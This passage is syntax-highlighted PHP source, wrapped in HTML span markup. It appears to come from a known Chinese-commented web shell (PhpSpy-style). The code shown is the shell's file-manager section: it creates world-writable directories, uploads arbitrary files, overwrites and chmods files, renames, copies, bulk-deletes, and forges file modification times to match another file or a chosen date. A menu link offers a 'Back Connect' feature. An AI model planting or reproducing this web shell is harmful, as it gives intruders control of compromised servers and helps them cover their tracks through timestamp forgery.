<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #8959a8;">&lt;?php</span> <span style="color: #718c00;">if</span> (!<span style="color: #c82829; font-weight: bold;">IS_WIN</span>) {<span style="color: #8959a8;">?&gt;</span> | <span style="color: #4271ae;">&lt;a</span> <span style="color: #4271ae;">href=</span><span style="color: #3e999f;">"javascript:g('backconnect');"</span><span style="color: #4271ae;">&gt;</span><span style="color: #c82829; font-weight: bold;">Back</span><span style="text-decoration: underline;"> </span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">Connect</span><span style="color: #4271ae; text-decoration: underline;">&lt;/a&gt;</span><span style="color: #8959a8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> }</span><span style="color: #8959a8; text-decoration: underline;">?&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/td&gt;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4271ae;">&lt;/tr&gt;</span>
<span style="color: #4271ae;">&lt;/table&gt;</span>
<span style="color: #4271ae;">&lt;table</span> <span style="color: #4271ae;">width=</span><span style="color: #3e999f;">"100%"</span> <span style="color: #4271ae;">border=</span><span style="color: #3e999f;">"0"</span> <span style="color: #4271ae;">cellpadding=</span><span style="color: #3e999f;">"15"</span> <span style="color: #4271ae;">cellspacing=</span><span style="color: #3e999f;">"0"</span><span style="color: #4271ae;">&gt;&lt;tr&gt;&lt;td&gt;</span>
<span style="color: #8959a8;">&lt;?php</span>
$<span style="color: #eab700;">errmsg</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">m(</span>$<span style="color: #eab700;">errmsg</span>);

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #718c00;">if</span> (!$<span style="color: #eab700;">dir</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dir</span> = $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #4271ae;">_SERVER</span>[<span style="color: #3e999f;">"DOCUMENT_ROOT"</span>] : <span style="color: #3e999f;">'.'</span>;
}
$<span style="color: #eab700;">nowpath</span> = <span style="color: #4d4d4c; background-color: #ffffff;">getPath(</span><span style="color: #c82829; font-weight: bold;">SA_ROOT</span>, $<span style="color: #eab700;">dir</span>);
<span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">substr(</span>$<span style="color: #eab700;">dir</span>, -<span style="color: #4d4d4c; background-color: #ffffff;">1</span>) != <span style="color: #3e999f;">'/'</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dir</span> = $<span style="color: #eab700;">dir</span>.<span style="color: #3e999f;">'/'</span>;
}

<span style="color: #718c00;">if</span> ($<span style="color: #eab700;">action</span> == <span style="color: #3e999f;">'file'</span>) {

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dir_writeable</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">is_writable(</span>$<span style="color: #eab700;">nowpath</span>) ? <span style="color: #3e999f;">'Writable'</span> : <span style="color: #3e999f;">'Non-writable'</span>;

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">newdirname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mkdirs</span> = $<span style="color: #eab700;">nowpath</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">newdirname</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">mkdirs</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Directory has already existed'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Directory created '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">mkdir(</span>$<span style="color: #eab700;">mkdirs</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0777</span>) ? <span style="color: #3e999f;">'success'</span> : <span style="color: #3e999f;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">chmod(</span>$<span style="color: #eab700;">mkdirs</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0777</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">doupfile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'File upload '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">copy(</span>$<span style="color: #4271ae;">_FILES</span>[<span style="color: #3e999f;">'uploadfile'</span>][<span style="color: #3e999f;">'tmp_name'</span>],$<span style="color: #eab700;">uploaddir</span>.<span style="color: #3e999f;">'/'</span><span style="text-decoration: underline;">.$</span><span style="color: #4271ae; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #3e999f; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #3e999f; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">editfilename</span> &amp;&amp; $<span style="color: #eab700;">filecontent</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fp</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">editfilename</span>,<span style="color: #3e999f;">'w'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Save file '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">fp</span>,$<span style="color: #eab700;">filecontent</span>) ? <span style="color: #3e999f;">'success'</span> : <span style="color: #3e999f;">'failed'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">pfile</span> &amp;&amp; $<span style="color: #eab700;">newperm</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">pfile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'The original file does not exist'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">newperm</span> = <span style="color: #4d4d4c; background-color: #ffffff;">base_convert(</span>$<span style="color: #eab700;">newperm</span>,<span style="color: #4d4d4c; background-color: #ffffff;">8</span>,<span style="color: #4d4d4c; background-color: #ffffff;">10</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Modify file attributes '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">chmod(</span>$<span style="color: #eab700;">pfile</span>,$<span style="color: #eab700;">newperm</span>) ? <span style="color: #3e999f;">'success'</span> : <span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#25913;&#21517;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">oldname</span> &amp;&amp; $<span style="color: #eab700;">newfilename</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">nname</span> = $<span style="color: #eab700;">nowpath</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">newfilename</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">nname</span>) || !<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">oldname</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span>$<span style="color: #eab700;">nname</span>.<span style="color: #3e999f;">' has already existed or original file does not exist'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(basename(</span>$<span style="color: #eab700;">oldname</span>).<span style="color: #3e999f;">' renamed '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">basename(</span>$<span style="color: #eab700;">nname</span>).(@<span style="color: #4d4d4c; background-color: #ffffff;">rename(</span>$<span style="color: #eab700;">oldname</span>,<span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #3e999f; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">sname</span> &amp;&amp; $<span style="color: #eab700;">tofile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">tofile</span>) || !<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">sname</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'The goal file has already existed or original file does not exist</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(basename(</span>$<span style="color: #eab700;">tofile</span>).<span style="color: #3e999f;">' copied '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">copy(</span>$<span style="color: #eab700;">sname</span>,$<span style="color: #eab700;">tofile</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">basename(</span>$<span style="color: #eab700;">to</span><span style="color: #eab700; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #3e999f; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">curfile</span> &amp;&amp; $<span style="color: #eab700;">tarfile</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!@<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">curfile</span>) || !@<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">tarfile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'The goal file has already existed or original file does not exist</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">time</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">tarfile</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Modify file the last modified '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">touch(</span>$<span style="color: #eab700;">curfile</span>,$<span style="color: #eab700;">time</span>,$<span style="color: #eab700;">time</span>) ? <span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">curfile</span> &amp;&amp; $<span style="color: #eab700;">year</span> &amp;&amp; $<span style="color: #eab700;">month</span> &amp;&amp; $<span style="color: #eab700;">day</span> &amp;&amp; $<span style="color: #eab700;">hour</span> &amp;&amp; $<span style="color: #eab700;">minute</span> &amp;&amp; $<span style="color: #eab700;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!@<span style="color: #4d4d4c; background-color: #ffffff;">file_exists(</span>$<span style="color: #eab700;">curfile</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(basename(</span>$<span style="color: #eab700;">curfile</span>).<span style="color: #3e999f;">' does not exist'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">time</span> = <span style="color: #4d4d4c; background-color: #ffffff;">strtotime(</span><span style="color: #3e999f;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Modify file the last modified '</span>.(@<span style="color: #4d4d4c; background-color: #ffffff;">touch(</span>$<span style="color: #eab700;">curfile</span>,$<span style="color: #eab700;">time</span>,$<span style="color: #eab700;">time</span>) ? <span style="color: #3e999f;">'</span><span style="color: #3e999f; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #3e999f; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span>($<span style="color: #eab700;">doing</span> == <span style="color: #3e999f;">'delfiles'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">dl</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dfiles</span>=<span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">succ</span> = $<span style="color: #eab700;">fail</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">dl</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">filepath</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">filepath</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (@<span style="color: #4d4d4c; background-color: #ffffff;">deltree(</span>$<span style="color: #eab700;">filepath</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">succ</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fail</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (@<span style="color: #4d4d4c; background-color: #ffffff;">unlink(</span>$<span style="color: #eab700;">filepath</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">succ</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">fail</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Deleted folder/file have finished,choose '</span>.<span style="color: #4d4d4c; background-color: #ffffff;">count(</span>$<span style="color: #eab700;">dl</span>).<span style="color: #3e999f;">' success '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">m(</span><span style="color: #3e999f;">'Please select folder/file(s)'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=<span style="color: #4271ae;">&gt;</span><span style="color: #3e999f;">'createdir'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'newdirname'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'fileperm'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'newperm'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'pfile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'copyfile'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'sname'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'tofile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'rename'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'oldname'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'newfilename'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>,$<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formhead(array(</span><span style="color: #3e999f;">'name'</span>=&gt;<span style="color: #3e999f;">'fileopform'</span>, <span style="color: #3e999f;">'target'</span>=&gt;<span style="color: #3e999f;">'_blank'</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'opfile'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'dir'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
